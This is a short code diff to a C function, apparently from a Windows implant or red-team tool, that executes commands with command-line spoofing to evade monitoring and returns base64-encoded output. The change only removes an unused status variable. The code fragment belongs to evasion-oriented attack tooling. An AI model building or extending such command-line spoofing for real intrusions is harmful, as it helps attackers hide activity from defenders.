@@ -127,7 +127,6 @@ cleanup:
 // Execute a command with cmdline evasion and capture output
 // Returns dynamically allocated string with output (caller must free), or NULL on failure
 char* executeCommandWithOutput(const char *command) {
-    BOOL status = FALSE;
     wchar_t *realCmdlineW = NULL;
     wchar_t *spoofedCmdlineW = NULL;
     STARTUPINFOEX si;
@@ -275,8 +274,6 @@ char* executeCommandWithOutput(const char *command) {
             output = strdup("ZXhlY3V0ZWQgKG5vIG91dHB1dCk="); // base64 for "executed (no output)"
         }
     }
-
-    status = TRUE;
 
 cleanup:
     if (buffer) free(buffer);
